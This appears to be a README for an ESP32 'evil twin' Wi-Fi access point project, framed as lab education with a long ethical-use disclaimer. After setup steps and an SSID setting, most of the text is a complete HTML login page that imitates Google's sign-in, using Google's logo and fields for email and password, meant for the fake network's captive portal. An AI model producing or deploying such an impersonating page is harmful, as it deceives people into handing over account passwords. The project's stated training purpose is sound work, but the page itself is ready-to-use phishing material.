
 ## evil_twin_with_esp32

This project demonstrates the concept of an "Evil Twin" wireless access point using an ESP32 microcontroller in a controlled laboratory environment. The objective is to help students and cybersecurity trainees understand how attackers may create a fake Wi-Fi network that mimics a legitimate one in order to deceive users into connecting to it.




# Disclaimer and Ethical Use Notice

## Educational Purpose Only

This project is provided solely for educational, research, and cybersecurity awareness purposes. Its purpose is to help students, researchers, educators, and security professionals understand wireless networking concepts, captive portal technologies, DNS behavior, and common security risks associated with public networks.

The software and accompanying documentation are intended to be used only in controlled laboratory environments, private test networks, or systems for which the user has obtained explicit authorization.

## No Unauthorized Use

Users must not use this project to:

* Gain unauthorized access to networks, systems, or devices.
* Collect, intercept, monitor, or store credentials, personal information, or communications without consent.
* Impersonate individuals, organizations, educational institutions, businesses, or services.
* Conduct phishing, social engineering, surveillance, or other deceptive activities.
* Disrupt, degrade, or interfere with network operations or services.
* Violate any applicable local, national, or international laws or regulations.

Any use of this project against networks, systems, or users without explicit authorization is strictly prohibited.

## User Responsibility

By downloading, compiling, modifying, distributing, or using this project, you acknowledge that:

* You are solely responsible for your actions.
* You understand the legal and ethical implications of security testing.
* You will comply with all applicable laws, regulations, policies, and terms of service.
* You will obtain proper authorization before conducting any security-related activities involving third-party systems or networks.

## No Warranty

THIS SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NON-INFRINGEMENT.

The authors and contributors make no guarantees regarding the accuracy, reliability, completeness, performance, or suitability of this software for any purpose.

## Limitation of Liability

IN NO EVENT SHALL THE AUTHORS, CONTRIBUTORS, COPYRIGHT HOLDERS, OR DISTRIBUTORS BE LIABLE FOR ANY CLAIM, DAMAGES, LOSSES, LEGAL ACTIONS, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, NEGLIGENCE, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR ITS USE.

This limitation includes, but is not limited to:

* Direct or indirect damages.
* Data loss or corruption.
* Service interruptions.
* Financial losses.
* Regulatory penalties.
* Civil or criminal liability resulting from misuse.

## Third-Party Rights

Users are responsible for respecting the privacy, security, intellectual property, and legal rights of all third parties. The authors do not authorize or endorse any activity that infringes upon those rights.

## Ethical Security Research

The authors support responsible and ethical cybersecurity research. Any testing performed using this project should be conducted only:

* In isolated laboratory environments.
* On personally owned equipment.
* On systems for which written permission has been granted.
* In accordance with responsible disclosure practices and applicable laws.

## Acceptance of Terms

By using, copying, modifying, compiling, distributing, or interacting with this project, you acknowledge that you have read, understood, and agreed to the terms of this disclaimer.

If you do not agree with these terms, do not use this software.

## Requrmnet 
###     Hardware 
ESP32 S3 -- note that i dint test it in other ESP32

### Software 

- Arduino IDE or PlatformIO
- ESP32 board support package installed
- Required libraries:
  - WiFi.h
  - WebServer.h
  - DNSServer.h
- Any seril app 
## Installation

1. Install Arduino IDE
2. Add ESP32 board support via Board Manager
3. Connect ESP32 via USB
4. Open the project code
5. Select the correct ESP32 board
6. Upload the firmware
7. Open Serial Monitor to view logs

```markdown
### Configuration

```cpp
// Change this to your desired network name
const char* ssid = "ESP32_Lab_AP";
 Here your html page 
 <!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#f8f9fa;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-container{
    width:400px;
    background:white;
    padding:40px;
    border-radius:8px;
    box-shadow:0 1px 3px rgba(0,0,0,0.15);
    text-align:center;
}

.logo img{
    width:120px;
    margin-bottom:15px;
}

h2{
    font-weight:400;
    margin-bottom:10px;
}

.subtitle{
    color:#5f6368;
    margin-bottom:30px;
}

.input-group{
    margin-bottom:15px;
}

input{
    width:100%;
    padding:14px;
    border:1px solid #dadce0;
    border-radius:4px;
    font-size:16px;
}

input:focus{
    outline:none;
    border-color:#1a73e8;
}

.actions{
    display:flex;
    justify-content:flex-end;
    margin-top:25px;
}

button{
    background:#1a73e8;
    color:white;
    border:none;
    padding:10px 24px;
    border-radius:4px;
    cursor:pointer;
    font-size:14px;
}

button:hover{
    background:#1765cc;
}

.link{
    display:block;
    text-align:left;
    color:#1a73e8;
    text-decoration:none;
    margin-top:10px;
    font-size:14px;
}
</style>
</head>

<body>

<div class="login-container">

    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
             alt="Google">
    </div>

    <h2>Sign in</h2>
    <p class="subtitle">Use your Google Account</p>

    <form>
        <div class="input-group">
            <input type="email" placeholder="Email or phone" required>
        </div>

        <div class="input-group">
            <input type="password" placeholder="Password" required>
        </div>

        <a href="#" class="link">Forgot email?</a>

        <div class="actions">
            <button type="submit">Next</button>
        </div>
    </form>

</div>

</body>
</html>



